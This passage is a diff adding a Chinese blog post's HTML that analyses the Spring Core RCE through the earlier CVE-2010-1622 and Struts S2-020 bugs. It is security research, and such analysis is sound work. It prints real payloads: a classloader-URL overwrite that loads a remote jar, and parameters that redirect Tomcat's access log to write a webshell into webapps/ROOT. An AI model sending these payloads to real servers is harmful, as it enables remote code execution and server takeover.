@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Spring Core RCE | Hello World</title>
+  <link rel = 'canonical' href = 'https://bikeknight.top/posts/spring-core-rce/'>
+  <meta name="description" content="Do not go gentle into that good night.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Spring Core RCE" />
+<meta property="og:description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修复的更新，这个漏洞的分析终于可以发出来了。
+这篇文章并不想做机械的调试分析，所以不会深入每一个细节，但是会将历史上一些相似的漏洞拿出来作为拼图，最后拼出一个完整的POC。
+这个 0day 本质上是对 CVE-2010-1622 的绕过，结合了 Structs S2-020 的利用方式，完成对 Tomcat 控制 Access 日志的 AccessLogValve 类的变量覆盖，控制日志文件的文件名、后缀、路径和内容，达到向 web 目录写 shell 的目的。
+JavaBean 的一般规范就是成员变量用 private 修饰，然后选择性的设置相应的 setter/getter 方法。除了比较熟悉的 Commons-BeanUtils 之外， Spring 中也封装了一套操作 Bean 的类，主要实现在 org.springframework.beans.BeanWrapperImpl 中，它是根据 Bean 中的 setter/getter 方法判断是否存在对应的属性，这就会导致一个问题：如果 Bean 中存在一个 getFoo()/setFoo(Foo foo) 方法，但是却没有对应的属性 foo ，Spring 还是会认为 Bean 存在一个 foo 属性，并通过 getFoo() 方法获取它的值。看下面这个例子：
+@Test public void BeanWrapperTest() {  BeanWrapperImpl beanWrapper = new BeanWrapperImpl(new User());  Arrays.stream(beanWrapper.getPropertyDescriptors()).forEach(System.out::println); }  // ############  org." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bikeknight.top/posts/spring-core-rce/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-01T23:30:57+08:00" />
+<meta property="article:modified_time" content="2022-04-01T23:30:57+08:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Spring Core RCE"/>
+<meta name="twitter:description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修复的更新，这个漏洞的分析终于可以发出来了。
+这篇文章并不想做机械的调试分析，所以不会深入每一个细节，但是会将历史上一些相似的漏洞拿出来作为拼图，最后拼出一个完整的POC。
+这个 0day 本质上是对 CVE-2010-1622 的绕过，结合了 Structs S2-020 的利用方式，完成对 Tomcat 控制 Access 日志的 AccessLogValve 类的变量覆盖，控制日志文件的文件名、后缀、路径和内容，达到向 web 目录写 shell 的目的。
+JavaBean 的一般规范就是成员变量用 private 修饰，然后选择性的设置相应的 setter/getter 方法。除了比较熟悉的 Commons-BeanUtils 之外， Spring 中也封装了一套操作 Bean 的类，主要实现在 org.springframework.beans.BeanWrapperImpl 中，它是根据 Bean 中的 setter/getter 方法判断是否存在对应的属性，这就会导致一个问题：如果 Bean 中存在一个 getFoo()/setFoo(Foo foo) 方法，但是却没有对应的属性 foo ，Spring 还是会认为 Bean 存在一个 foo 属性，并通过 getFoo() 方法获取它的值。看下面这个例子：
+@Test public void BeanWrapperTest() {  BeanWrapperImpl beanWrapper = new BeanWrapperImpl(new User());  Arrays.stream(beanWrapper.getPropertyDescriptors()).forEach(System.out::println); }  // ############  org."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://bikeknight.top/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://bikeknight.top/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://bikeknight.top/posts/hessianmemshell/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://bikeknight.top/posts/goinaction/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&text=Spring%20Core%20RCE" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&is_video=false&description=Spring%20Core%20RCE" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Spring%20Core%20RCE&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&title=Spring%20Core%20RCE" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&name=Spring%20Core%20RCE&description=Intro%20%e5%89%8d%e6%ae%b5%e6%97%b6%e9%97%b4%e7%9a%84Spring-core%20RCE%e4%bc%a0%e7%9a%84%e6%b2%b8%e6%b2%b8%e6%89%ac%e6%89%ac%ef%bc%8c%e8%87%aa%e5%b7%b1%e5%88%86%e6%9e%90%e5%ae%8c%e4%b9%8b%e5%90%8e%e8%a7%89%e5%be%97%e5%b9%b6%e6%b2%a1%e6%9c%89pr%e7%9a%84%e9%82%a3%e4%b9%88%e2%80%9c%e6%a0%b8%e5%bc%b9%e2%80%9d%ef%bc%8c%e5%8f%8d%e8%80%8c%e8%a7%89%e5%be%97%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e8%8c%83%e5%9b%b4%e5%85%b6%e5%ae%9e%e6%8c%ba%e7%aa%84%e7%9a%84%ef%bc%8c%e9%9a%8f%e7%9d%80%e5%ae%98%e6%96%b9%e4%bf%ae%e5%a4%8d%e7%9a%84%e6%9b%b4%e6%96%b0%ef%bc%8c%e8%bf%99%e4%b8%aa%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90%e7%bb%88%e4%ba%8e%e5%8f%af%e4%bb%a5%e5%8f%91%e5%87%ba%e6%9d%a5%e4%ba%86%e3%80%82%0a%e8%bf%99%e7%af%87%e6%96%87%e7%ab%a0%e5%b9%b6%e4%b8%8d%e6%83%b3%e5%81%9a%e6%9c%ba%e6%a2%b0%e7%9a%84%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90%ef%bc%8c%e6%89%80%e4%bb%a5%e4%b8%8d%e4%bc%9a%e6%b7%b1%e5%85%a5%e6%af%8f%e4%b8%80%e4%b8%aa%e7%bb%86%e8%8a%82%ef%bc%8c%e4%bd%86%e6%98%af%e4%bc%9a%e5%b0%86%e5%8e%86%e5%8f%b2%e4%b8%8a%e4%b8%80%e4%ba%9b%e7%9b%b8%e4%bc%bc%e7%9a%84%e6%bc%8f%e6%b4%9e%e6%8b%bf%e5%87%ba%e6%9d%a5%e4%bd%9c%e4%b8%ba%e6%8b%bc%e5%9b%be%ef%bc%8c%e6%9c%80%e5%90%8e%e6%8b%bc%e5%87%ba%e4%b8%80%e4%b8%aa%e5%ae%8c%e6%95%b4%e7%9a%84POC%e3%80%82%0a%e8%bf%99%e4%b8%aa%200day%20%e6%9c%ac%e8%b4%a8%e4%b8%8a%e6%98%af%e5%af%b9%20CVE-2010-1622%20%e7%9a%84%e7%bb%95%e8%bf%87%ef%bc%8c%e7%bb%93%e5%90%88%e4%ba%86%20Structs%20S2-020%20%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%ef%bc%8c%e5%ae%8c%e6%88%90%e5%af%b9%20Tomcat%20%e6%8e%a7%e5%88%b6%20Access%20%e6%97%a5%e5%bf%97%e7%9a%84%20AccessLogValve%20%e7%b1%bb%e7%9a%84%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%ef%bc%8c%e6%8e%a7%e5%88%b6%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6%e7%9a%84%e6%96%87%e4%bb%b6%e5%90%8d%e3%80%81%e5%90%8e%e7%bc%80%e3%80%81%e8%b7%af%e5%be%84%e5%92%8c%e5%86%85%e5%ae%b9%ef%bc%8c%e8%be%be%e5%88%b0%e5%90%91%20web%20%e7%9b%ae%e5%bd%95%e5%86%99%20shell%20%e7%9a%84%e7%9b%ae%e7%9a%84%e3%80%82%0aJavaBean%20%e7%9a%84%e4%b8%80%e8%88%ac%e8%a7%84%e8%8c%83%e5%b0%b1%e6%98%af%e6%88%90%e5%91%98%e5%8f%98%e9%87%8f%e7%94%a8%20private%20%e4%bf%ae%e9%a5%b0%ef%bc%8c%e7%84%b6%e5%90%8e%e9%80%89%e6%8b%a9%e6%80%a7%e7%9a%84%e8%ae%be%e7%bd%ae%e7%9b%b8%e5%ba%94%e7%9a%84%20setter%2fgetter%20%e6%96%b9%e6%b3%95%e3%80%82%e9%99%a4%e4%ba%86%e6%af%94%e8%be%83%e7%86%9f%e6%82%89%e7%9a%84%20Commons-BeanUtils%20%e4%b9%8b%e5%a4%96%ef%bc%8c%20Spring%20%e4%b8%ad%e4%b9%9f%e5%b0%81%e8%a3%85%e4%ba%86%e4%b8%80%e5%a5%97%e6%93%8d%e4%bd%9c%20Bean%20%e7%9a%84%e7%b1%bb%ef%bc%8c%e4%b8%bb%e8%a6%81%e5%ae%9e%e7%8e%b0%e5%9c%a8%20org.springframework.beans.BeanWrapperImpl%20%e4%b8%ad%ef%bc%8c%e5%ae%83%e6%98%af%e6%a0%b9%e6%8d%ae%20Bean%20%e4%b8%ad%e7%9a%84%20setter%2fgetter%20%e6%96%b9%e6%b3%95%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e5%af%b9%e5%ba%94%e7%9a%84%e5%b1%9e%e6%80%a7%ef%bc%8c%e8%bf%99%e5%b0%b1%e4%bc%9a%e5%af%bc%e8%87%b4%e4%b8%80%e4%b8%aa%e9%97%ae%e9%a2%98%ef%bc%9a%e5%a6%82%e6%9e%9c%20Bean%20%e4%b8%ad%e5%ad%98%e5%9c%a8%e4%b8%80%e4%b8%aa%20getFoo%28%29%2fsetFoo%28Foo%20foo%29%20%e6%96%b9%e6%b3%95%ef%bc%8c%e4%bd%86%e6%98%af%e5%8d%b4%e6%b2%a1%e6%9c%89%e5%af%b9%e5%ba%94%e7%9a%84%e5%b1%9e%e6%80%a7%20foo%20%ef%bc%8cSpring%20%e8%bf%98%e6%98%af%e4%bc%9a%e8%ae%a4%e4%b8%ba%20Bean%20%e5%ad%98%e5%9c%a8%e4%b8%80%e4%b8%aa%20foo%20%e5%b1%9e%e6%80%a7%ef%bc%8c%e5%b9%b6%e9%80%9a%e8%bf%87%20getFoo%28%29%20%e6%96%b9%e6%b3%95%e8%8e%b7%e5%8f%96%e5%ae%83%e7%9a%84%e5%80%bc%e3%80%82%e7%9c%8b%e4%b8%8b%e9%9d%a2%e8%bf%99%e4%b8%aa%e4%be%8b%e5%ad%90%ef%bc%9a%0a%40Test%20public%20void%20BeanWrapperTest%28%29%20%7b%20%20BeanWrapperImpl%20beanWrapper%20%3d%20new%20BeanWrapperImpl%28new%20User%28%29%29%3b%20%20Arrays.stream%28beanWrapper.getPropertyDescriptors%28%29%29.forEach%28System.out%3a%3aprintln%29%3b%20%7d%20%20%2f%2f%20%23%23%23%23%23%23%23%23%23%23%23%23%20%20org." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fspring-core-rce%2f&t=Spring%20Core%20RCE" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#cve-2010-1622">CVE-2010-1622</a></li>
+    <li><a href="#structs-s2-020">Structs S2-020</a></li>
+    <li><a href="#spring-core-rce">Spring-core RCE</a></li>
+    <li><a href="#fix">Fix</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Spring Core RCE
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-04-01 23:30:57 &#43;0800 CST" itemprop="datePublished">2022-04-01</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/java%E5%AE%89%E5%85%A8" rel="tag">Java安全</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" rel="tag">漏洞分析</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h2 id="intro">Intro</h2>
+<p>前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修复的更新，这个漏洞的分析终于可以发出来了。</p>
+<p>这篇文章并不想做机械的调试分析，所以不会深入每一个细节，但是会将历史上一些相似的漏洞拿出来作为拼图，最后拼出一个完整的POC。</p>
+<p>这个 0day 本质上是对 <a href="http://rui0.cn/archives/1158">CVE-2010-1622</a> 的绕过，结合了 <a href="https://cloud.tencent.com/developer/article/1035297">Structs S2-020</a> 的利用方式，完成对 Tomcat 控制 Access 日志的 <code>AccessLogValve</code> 类的变量覆盖，控制日志文件的文件名、后缀、路径和内容，达到向 web 目录写 shell 的目的。</p>
+<p>JavaBean 的一般规范就是成员变量用 <code>private</code> 修饰，然后选择性的设置相应的 <code>setter/getter</code> 方法。除了比较熟悉的 <code>Commons-BeanUtils</code> 之外， Spring 中也封装了一套操作 Bean 的类，主要实现在 <code>org.springframework.beans.BeanWrapperImpl</code> 中，它是根据 Bean 中的 <code>setter/getter</code> 方法判断是否存在对应的属性，这就会导致一个问题：如果 Bean 中存在一个 <code>getFoo()/setFoo(Foo foo)</code> 方法，但是却没有对应的属性 <code>foo</code> ，Spring 还是会认为 Bean 存在一个 <code>foo</code> 属性，并通过 <code>getFoo()</code> 方法获取它的值。看下面这个例子：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ffa500">@Test</span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">BeanWrapperTest</span>() {
+</span></span><span style="display:flex;"><span> 	 BeanWrapperImpl beanWrapper = <span style="color:#6ab825;font-weight:bold">new</span> BeanWrapperImpl(<span style="color:#6ab825;font-weight:bold">new</span> User());
+</span></span><span style="display:flex;"><span> 	 Arrays.<span style="color:#bbb">stream</span>(beanWrapper.<span style="color:#bbb">getPropertyDescriptors</span>()).<span style="color:#bbb">forEach</span>(System.<span style="color:#bbb">out</span>::println);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// ############
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>org.<span style="color:#bbb">springframework</span>.<span style="color:#bbb">beans</span>.<span style="color:#bbb">GenericTypeAwarePropertyDescriptor</span>[name=alias]
+</span></span><span style="display:flex;"><span>org.<span style="color:#bbb">springframework</span>.<span style="color:#bbb">beans</span>.<span style="color:#bbb">GenericTypeAwarePropertyDescriptor</span>[name=class]
+</span></span><span style="display:flex;"><span>org.<span style="color:#bbb">springframework</span>.<span style="color:#bbb">beans</span>.<span style="color:#bbb">GenericTypeAwarePropertyDescriptor</span>[name=id]
+</span></span><span style="display:flex;"><span>org.<span style="color:#bbb">springframework</span>.<span style="color:#bbb">beans</span>.<span style="color:#bbb">GenericTypeAwarePropertyDescriptor</span>[name=name]
+</span></span></code></pre></div><p>即使 <code>User</code> 这个类中没有 <code>class</code> 属性，还是 <code>BeanWrapperImpl</code> 还是获取到了，原因在于所有类都会继承 <code>Object</code> ，而 <code>Object</code> 中有个方法为 <code>getClass()</code> 。</p>
+<p>Spring 中有一个特性叫做「变量绑定」，简单来说就是前端传入 Bean 的属性，后端可以自动实例化 Bean ，然后根据传入的属性为其赋值：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#ffa500">@RequestMapping</span>(<span style="color:#ed9d13">&#34;/hello&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#6ab825;font-weight:bold">public</span> String <span style="color:#447fcf">fooBind</span>(Model model, User user) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 	 model.<span style="color:#bbb">addAttribute</span>(<span style="color:#ed9d13">&#34;user&#34;</span>, user);
+</span></span><span style="display:flex;"><span> 	 model.<span style="color:#bbb">addAttribute</span>(<span style="color:#ed9d13">&#34;name&#34;</span>, user.<span style="color:#bbb">getName</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 	 <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#ed9d13">&#34;hello&#34;</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// #############
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>POST id=1&amp;name=bar
+</span></span></code></pre></div><p>在绑定的过程里，自然要操纵 Bean 为相应的属性赋值，这个过程在 <code>org.springframework.validation.DataBinder#bind</code> 方法中。</p>
+<p>在这个过程中会引发一个变量覆盖的问题，这也是 CVE-2010-1622 和本漏洞的利用方式，简单来说，如果要对普通类型的属性赋值，必须存在 <code>setter</code> 方法才能赋值成功，否则就会抛出异常，但是如果属性的类型是 <code>Array | List | Map</code> 的话，就是直接操作 <code>getter</code> 方法返回的值，所以如果可以保证 <code>getter</code> 方法返回的值是类中的属性的一个引用（对象引用，而不是一个 <code>clone</code> 或产生新的对象），那么就会造成变量覆盖。</p>
+<p>举例来说，我们给 <code>User</code> 加入一个 <code>String[]</code> 类型的属性，并且只有 <code>getter</code> 方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">User</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">private</span> <span style="color:#6ab825;font-weight:bold">int</span> id;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">private</span> String name;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">private</span> String[] alias = <span style="color:#6ab825;font-weight:bold">new</span> String[]{<span style="color:#ed9d13">&#34;Bob&#34;</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">// setter &amp; getter ...
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">public</span> String[] <span style="color:#447fcf">getAlias</span>() {
+</span></span><span style="display:flex;"><span>		 <span style="color:#6ab825;font-weight:bold">return</span> alias;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>传入 <code>alias[0]=Tom</code> ，随后输出一下结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#ffa500">@RequestMapping</span>(<span style="color:#ed9d13">&#34;/hello&#34;</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ffa500">@ResponseBody</span>
+</span></span><span style="display:flex;"><span> <span style="color:#6ab825;font-weight:bold">public</span> String <span style="color:#447fcf">fooBind</span>(Model model, User user) {
+</span></span><span style="display:flex;"><span> 	 <span style="color:#6ab825;font-weight:bold">return</span> Arrays.<span style="color:#bbb">toString</span>(user.<span style="color:#bbb">getAlias</span>());
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">// ############
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>[Tom]
+</span></span></code></pre></div><p>此外，Spring 还支持属性的嵌套，要进行参数绑定的 Bean 会作为 <code>Root Object</code> ，可以通过传入下面这样的参数，来操作属性的属性：</p>
+<pre tabindex="0"><code>class.classLaoder
+</code></pre><p>Spring 收到这样的参数之后，会引入一个 <code>Wrapped Object</code> ， 这个对象就是上一个 <code>Wrapped Object</code> 调用 <code>getXXX()</code> 获取的结果，<code>Root Object</code> 是初始的 <code>Wrapped Object</code>，上面的传入的参数就会变成如下的方法调用：</p>
+<pre tabindex="0"><code>user.getClass().getclassLoader()
+</code></pre><h2 id="cve-2010-1622">CVE-2010-1622</h2>
+<p>回到 CVE-2010-1622 中，这个漏洞的 Payload 如下：</p>
+<pre tabindex="0"><code>class.classLoader.URLs[0]=jar:http://127.0.0.1:8000/sp-exp.jar!/
+</code></pre><p>结合上面提到的 Spring 特性，很容易发现条 Payload 是覆盖 <code>classLoader</code> 的 <code>URLs</code> 数组中的第一个 <code>URL</code> 。
+在 SpringMVC 环境（更普遍来说，是以War包部署在Tomcat上的Spring应用）下，由于应用需要部署到 Tomcat 上，所以这里的 <code>classLoader</code> 是 Tomcat 中的 <code>WebAppClassLoader</code> ，它继承了 <code>URLClassLoader</code> ，在 Tomcat 6.0.28 之前，它的 <code>getURLs()</code> 方法会直接返回成员变量 <code>repositoryURLs</code> 的<strong>引用</strong>，所以这里有了可以变量覆盖的可能：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> URL[] <span style="color:#447fcf">getURLs</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">repositoryURLs</span> != <span style="color:#6ab825;font-weight:bold">null</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">repositoryURls</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//...
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span></code></pre></div><p>关于覆盖完 <code>URLs</code> 之后的利用步骤，不是本文的重点，漏洞爆出之后，Spring 做了这样的修复，如果 <code>Wrapped Object</code> 的类型是 <code>java.lang.Class</code> ，且属性名为 <code>classLoader</code> 的时候，就会直接 continue，不将属性放入 <code>cache</code> 中，下面这段代码的在 <code>CachedIntrospectionResults</code> 的构造方法中：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331155527.png" alt="img"></p>
+<p>这样就可以在数据绑定的过程中禁止了对 <code>Class</code> 类的 <code>classLoader</code> 属性的获取 ，同时 Tomcat 也进行了修复，将 <code>getURLs()</code> 方法的返回结果改成了 <code>repositoryURLs</code> 的 <code>clone</code> ，也就无法直接修改该属性了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> URL[] <span style="color:#447fcf">getURLs</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">repositoryURLs</span> != <span style="color:#6ab825;font-weight:bold">null</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">this</span>.<span style="color:#bbb">repositoryURls</span>.<span style="color:#bbb">clone</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//...
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span></code></pre></div><h2 id="structs-s2-020">Structs S2-020</h2>
+<p>在 Structs S2-020 这个洞里面，同样是变量覆盖（这个洞是用 OGNL 表达式进行覆盖），它的利用方式是修改 Tomcat 的日志文件配置，向 web 目录中写入 WebShell ：</p>
+<pre tabindex="0"><code>class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.classLoader.resources.context.parent.pipeline.first.prefix=shell
